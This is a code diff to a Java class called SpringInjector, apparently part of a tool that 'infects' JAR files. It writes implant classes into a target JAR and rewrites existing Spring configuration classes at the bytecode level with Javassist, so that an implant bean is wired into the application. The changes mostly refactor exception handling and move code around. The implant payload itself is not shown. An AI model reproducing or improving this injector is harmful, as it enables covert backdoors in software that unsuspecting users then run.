@@ -10,7 +10,6 @@ import java.nio.file.Path;
 import java.util.*;
 import java.util.jar.JarEntry;
 import java.util.logging.Logger;
-import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
 
@@ -67,11 +66,9 @@ public class SpringInjector implements Injector {
                 try {
                     fiddler.addNewEntry(newJarEntry, asByteArray(implantComponent));
                     countComponentsCreated++;
-                } catch (ZipException e) {
-                    // QUICKFIX: The entry most likely already exist in the ZIP file
+                } catch (DuplicateEntryException e) {
                     log.warning("Class '" + newJarEntry + "' already exist in JAR '" + outputJar + "'. Skipping.");
-                    continue;
-                    // TODO This is _not_ a solid way of moving on. The actual class in the JAR could be something else than implantComponent.
+                    break;
                 }
                 log.fine("Created implant class '" + newJarEntry.getName() + "'.");
 
@@ -95,8 +92,6 @@ public class SpringInjector implements Injector {
                 }
 
                 didInfect = true;
-            } catch (ClassNotFoundException e) {
-                throw new RuntimeException(e);
             }
         }
         log.info("Modified " + countConfigModifications + " Spring configuration classes.");
@@ -124,7 +119,7 @@ public class SpringInjector implements Injector {
                 JarEntry newJarEntry = new JarEntry(className.getClassFilePath());
                 try {
                     fiddler.addNewEntry(newJarEntry, fileContent);
-                } catch (ZipException e) {
+                } catch (DuplicateEntryException e) {
                     // Anyone who've debugged dependency conflicts in Java knows this is the time to just back off
                     log.severe("Dependency file '" + className.getClassFilePath() + "' already exist. Aborting.");
                     didInfect = false;
@@ -143,7 +138,7 @@ public class SpringInjector implements Injector {
         return didInfect;
     }
 
-    static Optional<ClassFile> addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) throws ClassNotFoundException {
+    static Optional<ClassFile> addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) {
         ClassFile clonedSpringConfig = cloneClassFile(existingSpringConfig);
 
         ClassName implantSpringConfigClassName = ClassName.of(implantSpringConfig);
@@ -161,30 +156,31 @@ public class SpringInjector implements Injector {
                 return Optional.empty();
             }
 
+            Map<String, String> translateTable = new HashMap<>();
+            translateTable.put(implantPackageDesc + "/" + implantComponentClassName.getClassName(), targetPackageDesc + "/" + implantComponentClassName.getClassName());
+            translateTable.put(implantSpringConfigClassName.getClassFormatInternalName(), existingSpringConfigClassName.getClassFormatInternalName());
+
+            String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
+            MethodInfo targetBeanMethod = new MethodInfo(clonedSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
+            targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
+
+            CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(clonedSpringConfig.getConstPool(), translateTable);
+            codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
+            targetBeanMethod.setCodeAttribute(codeAttr);
+
+            ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
+            if (exceptionsAttr != null) {
+                ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(clonedSpringConfig.getConstPool(), translateTable);
+                targetBeanMethod.setExceptionsAttribute(exceptions);
+            }
+
+            copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
+
             try {
-                Map<String, String> translateTable = new HashMap<>();
-                translateTable.put(implantPackageDesc + "/" + implantComponentClassName.getClassName(), targetPackageDesc + "/" + implantComponentClassName.getClassName());
-                translateTable.put(implantSpringConfigClassName.getClassFormatInternalName(), existingSpringConfigClassName.getClassFormatInternalName());
-
-                String implantBeanMethodDesc = implantBeanMethod.getDescriptor().replace(implantPackageDesc, targetPackageDesc);
-                MethodInfo targetBeanMethod = new MethodInfo(clonedSpringConfig.getConstPool(), implantBeanMethod.getName(), implantBeanMethodDesc);
-                targetBeanMethod.getAttributes().removeIf(Objects::isNull); // Workaround for some internal bug in Javassist
-
-                CodeAttribute codeAttr = (CodeAttribute) implantBeanMethod.getCodeAttribute().copy(clonedSpringConfig.getConstPool(), translateTable);
-                codeAttr.setMaxLocals(implantBeanMethod.getCodeAttribute().getMaxLocals());
-                targetBeanMethod.setCodeAttribute(codeAttr);
-
-                ExceptionsAttribute exceptionsAttr = implantBeanMethod.getExceptionsAttribute();
-                if (exceptionsAttr != null) {
-                    ExceptionsAttribute exceptions = (ExceptionsAttribute) exceptionsAttr.copy(clonedSpringConfig.getConstPool(), translateTable);
-                    targetBeanMethod.setExceptionsAttribute(exceptions);
-                }
-
-                copyAllMethodAnnotations(targetBeanMethod, implantBeanMethod);
-
                 clonedSpringConfig.addMethod(targetBeanMethod);
             } catch (DuplicateMemberException e) {
-                throw new RuntimeException(e);
+                // This should already have be checked for
+                throw new RuntimeException("Method '" + targetBeanMethod + "' already exist in '" + clonedSpringConfig.getName() + "' which is already checked for. This is unexpected.", e);
             }
         }
 
